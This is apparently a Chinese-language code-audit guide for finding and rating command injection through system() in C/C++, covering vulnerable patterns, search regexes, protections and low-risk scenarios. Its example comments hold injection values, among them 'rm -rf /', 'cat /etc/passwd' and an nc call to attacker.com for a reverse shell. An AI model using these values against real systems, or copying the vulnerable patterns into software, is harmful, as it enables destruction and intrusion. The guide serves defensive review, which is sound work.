# C/C++ 代码注入：system() 函数用户输入执行

## Details

### 漏洞成因

`system()` 函数通过 `/bin/sh -c` 执行命令字符串，当用户输入未经充分验证直接拼接到命令字符串时，攻击者可通过 shell 元字符（`;`, `|`, `&`, `$()`, 反引号等）注入任意命令，导致任意命令执行。与 exec 系列函数不同，system() 的危险在于它隐式调用了 shell 解释器，使得 shell 特殊字符的解析成为漏洞的主要通道。

### 代码示例

```c
// 危险示例 1：直接字符串拼接
char command[256];
sprintf(command, "ping %s", user_input);
system(command);  // 用户输入: "127.0.0.1; rm -rf /" → "ping 127.0.0.1; rm -rf /"

// 危险示例 2：格式化字符串拼接
char hostname[64];
strcpy(hostname, user_input);
char cmd[512];
sprintf(cmd, "nslookup %s", hostname);
system(cmd);  // 用户输入: "127.0.0.1`whoami`" → "nslookup 127.0.0.1`whoami`"

// 危险示例 3：环境变量注入
const char *file = getenv("FILE_PATH");
char cmd[1024];
sprintf(cmd, "cat %s", file);
system(cmd);  // 环境变量 FILE_PATH="file.txt | cat /etc/passwd"

// 危险示例 4：变量拼接
char username[100];
strncpy(username, req_param, 99);
char cmd[256];
sprintf(cmd, "mail %s < template.txt", username);
system(cmd);  // 用户输入: "user@domain.com; nc attacker.com 1234" 导致反向 shell
```

### 快速定位核心操作 `[L1:关键词扫描]`

**关键函数识别：**
- 搜索函数：`system()`、`popen()`（相关但更危险）
- 变体形式：`system()` 的直接调用，包括通过宏定义的版本
- 示例搜索模式：
  ```
  system\s*\(\s*"  # system("开头
  system\s*\(\s*[a-zA-Z_]  # system(变量开头
  sprintf.*system  # sprintf + system 组合
  snprintf.*system  # snprintf + system 组合
  strcat.*system   # strcat/strcpy + system 组合
  ```

**危险标记识别：**
- 函数参数中包含用户可控变量（网络参数、文件内容、环境变量、命令行参数等）
- 使用字符串拼接操作（sprintf、snprintf、strcat、strcpy 等）构造命令
- 拼接目标涉及用户输入的字段
- 变量来自外部数据源未进行验证

**详细定位技巧 `[L2:跳读]`：**
- 定位 system() 调用点后，回溯查找该参数来源
- 追踪参数的构造过程，识别所有参与拼接的变量
- 标记每个参与拼接的变量是否来自用户输入或信任的内部源
- 在跨文件/跨函数的情况下需要 `[L4:跨模块追踪]`

### 快速定位保护机制 `[L2:跳读]`

**参数验证层：**
- 搜索关键字：`validate`、`check`、`verify`、`sanitize`、`escape`、`quote`
- 白名单验证：
  ```c
  // 白名单示例
  if (strcmp(cmd, "command1") != 0 && strcmp(cmd, "command2") != 0) {
      return error;  // 拒绝非预设命令
  }
  system(cmd);
  ```
- 字符过滤：禁止 shell 元字符
  ```c
  // 危险字符检查
  if (strchr(input, ';') || strchr(input, '|') || strchr(input, '&') ||
      strchr(input, '$') || strchr(input, '`') || strchr(input, '(') ||
      strchr(input, ')') || strchr(input, '<') || strchr(input, '>')) {
      return error;
  }
  ```
- 引号处理：shell 转义
  ```c
  // 使用单引号包裹，防止变量展开和命令替换
  char cmd[512];
  sprintf(cmd, "echo '%s'", user_input);  // 比直接拼接更安全
  ```

**执行环境隔离：**
- 环境变量清理：搜索 `clearenv()`、`unsetenv()`
- 工作目录切换：搜索 `chdir()`
- 权限降级：搜索 `setuid()`、`setgid()`、`setresuid()`、`setresgid()`
- 进程隔离：搜索 `fork()`、`execve` 等进程创建机制

**替代方案检查 `[L3:逐行读]`：**
- 是否使用了 exec 系列函数替代 system()（更安全，不需要 shell）
  ```c
  // 更安全的替代方案：避免使用 system()
  pid_t pid = fork();
  if (pid == 0) {
      execv("/usr/bin/ping", argv);  // 绝对路径，无 shell 解释
  }
  ```
- 是否使用了库函数而非直接命令执行
- 是否限制了 system() 调用仅在特定、安全的上下文中

**跨模块保护检查 `[L4:跨模块追踪]`：**
- 在调用 system() 前是否存在全局输入验证/过滤函数
- 是否在应用初始化阶段进行了环境清理
- 是否通过框架层提供的安全 API 而非直接调用 system()

---

## Classify

### 确认为漏洞的必要条件

**漏洞判定流程：**

1. **源头确认**：验证 system() 参数确实包含用户可控的数据
   - 用户输入来自网络请求、文件、环境变量、命令行参数等
   - 输入不是编译时常量或内部固定生成

2. **验证充分性评估**：
   - **完整白名单**：system() 参数仅能是预定义命令集合中的一个 → 低风险/误报
   - **仅黑名单过滤**：排除特定危险字符但可能被绕过（如编码、双重编码）→ 漏洞
   - **部分过滤**：过滤部分字符但不完整（如仅过滤 `;` 但保留 `|`）→ 漏洞
   - **无验证**：直接拼接用户输入 → 漏洞

3. **shell 执行路径分析**：
   - system() 总是调用 `/bin/sh -c`，因此 shell 元字符总是被解释
   - 如果参数包含任何用户数据，shell 元字符的威胁始终存在
   - 即使字符串经过部分转义，仍需评估是否完整

### 误报判定标准

- **参数为编译时常量**：
  ```c
  system("date");  // 常量，无漏洞
  ```

- **参数完全由应用逻辑生成，用户仅能选择预设值**：
  ```c
  const char *commands[] = {"ls", "pwd", "whoami"};
  int index = user_input;  // 用户仅能提供索引
  if (index < 0 || index >= 3) return;
  system(commands[index]);  // 安全
  ```

- **用户输入经过了完整白名单验证**：
  ```c
  if (strcmp(hostname, "localhost") != 0 &&
      strcmp(hostname, "127.0.0.1") != 0) {
      return error;
  }
  sprintf(cmd, "ping %s", hostname);
  system(cmd);  // 白名单覆盖，低风险
  ```

- **参数在调用 system() 前已通过严格的规范化和验证**：
  ```c
  // 严格验证：仅允许字母、数字、点
  if (!regex_match(user_input, "^[a-zA-Z0-9.]+$")) {
      return error;
  }
  sprintf(cmd, "ping %s", user_input);
  system(cmd);  // 字符集约束，低风险
  ```

### 代码异味识别

- **多层函数调用链**：用户输入在中间函数中流入 system()，需追踪完整链路（L4）
- **条件分支动态拼接**：不同代码分支有不同的拼接逻辑，需评估所有分支
- **不完整的过滤**：过滤了部分字符但遗漏了其他 shell 元字符
- **注释中的"TODO"或"FIXME"**：表明开发者意识到的安全问题
- **环境变量的使用**：来自环境的参数可能被攻击者污染

---

## Low risk

### 低风险评级场景

**场景一：完整参数白名单**
- system() 参数值完全限定在预定义的安全命令或参数集合内
- 白名单基于业务功能需求完整设计，覆盖所有代码分支和条件路径
- 用户输入仅用于索引、选择或直接匹配白名单项，不作为参数内容本身参与拼接
- 示例：
  ```c
  const char *allowed_commands[] = {"report-user", "list-files", "backup-db"};
  int choice = atoi(user_input);
  if (choice < 0 || choice >= 3) return error;
  system(allowed_commands[choice]);
  ```
- 评级依据：参数空间有限且完全可控，shell 注入无法利用

**场景二：严格的参数内容约束**
- 用户输入的字符集严格限制于安全子集，明确排除所有 shell 元字符
- 安全子集定义清晰，如：`[a-zA-Z0-9_.-]`（字母、数字、下划线、点、连字符）
- 长度有明确上限约束，防止缓冲区溢出和超长参数注入
- 示例：
  ```c
  // 严格的正则表达式验证
  if (!regex_match(user_input, "^[a-zA-Z0-9_-]+$") || strlen(user_input) > 64) {
      return error;
  }
  sprintf(cmd, "kill -TERM %s", user_input);
  system(cmd);
  ```
- 评级依据：字符集约束彻底排除了 shell 元字符的利用

**场景三：完整的参数转义和引号保护**
- 用户输入被完整包裹在单引号内，防止变量展开和命令替换
- 单引号内的特殊字符被正确转义（如 `'\''` 表示单引号字符本身）
- 示例：
  ```c
  char cmd[1024];
  // 使用单引号和转义处理完整保护参数
  snprintf(cmd, sizeof(cmd), "mail '%s' < template.txt",
           escape_single_quotes(user_input));
  system(cmd);
  ```
- 评级依据：shell 元字符被引号禁用，无法解释为命令语法

**场景四：多层防护组合（纵深防御）**
- 虽未达成单一的完整白名单，但实现了多个独立有效的防御层
- 防护层包括：字符过滤（禁用关键元字符）+ 长度限制 + 类型验证 + 权限降级
- 各防护层在逻辑上独立且都有效，组合使用显著提升攻击难度
- 示例：
  ```c
  // 多层防护
  if (strlen(user_input) > 128) return error;                      // 长度限制
  if (strpbrk(user_input, ";|&$`()\\<>")) return error;           // 黑字符过滤
  char escaped[256];
  escape_dangerous_chars(escaped, user_input);                    // 转义
  setuid(nobody_uid);                                             // 权限降级
  sprintf(cmd, "/usr/bin/logger '%s'", escaped);
  system(cmd);
  ```
- 评级依据：多层防护联合作用，绕过任意一层都需要多个漏洞

**场景五：严格的执行权限和环境隔离**
- system() 调用仅在特定的、低权限的系统用户下执行（如 `nobody`、专用服务账户）
- 代码运行在容器或虚拟机内，进程隔离限制了命令执行的影响范围
- 应用已清理环境变量或采用最小化的、可信的环境变量集合
- 示例：
  ```c
  // 清理环境并权限降级
  clearenv();
  setenv("PATH", "/usr/bin:/bin", 1);
  setuid(limited_user_uid);
  system(cmd);
  ```
- 评级依据：即使命令执行成功，影响范围被隔离和权限限制

**场景六：非网络可达的输入源**
- 用户输入来自本地配置文件或应用内部数据结构，非网络可控
- 输入在编译时已固定或仅由系统管理员修改
- 示例：
  ```c
  // 从配置文件读取（非网络请求）
  FILE *config = fopen("/etc/app/config", "r");
  fscanf(config, "command=%s", config_command);
  system(config_command);  // 仅管理员可修改配置文件
  ```
- 评级依据：攻击者无法通过常规网络通道控制输入

### 评级决策补充

- **仅字符黑名单过滤但不包含完整的 shell 元字符集合** → 中等风险或高风险（非低风险）
  - 例：仅过滤 `;` 和 `|` 但保留 `&` 和 `$(...)` → 仍可注入

- **参数经过部分转义但存在绕过可能** → 中等风险（非低风险）
  - 例：仅转义空格但未处理引号 → 仍可通过引号注入

- **单一防护层有效但缺乏纵深防御** → 中等风险（除非该防护是完整白名单）
  - 例：仅限制字符集但未限制长度，可能通过超长输入触发其他漏洞

- **环境变量未清理而权限降级不足** → 中等风险或高风险
  - 例：用户可通过 `PATH` 污染劫持命令执行

- **虽有防护但防护代码存在可绕过的逻辑漏洞** → 需具体分析
  - 例：白名单检查不区分大小写，可通过大小写混写绕过 → 漏洞
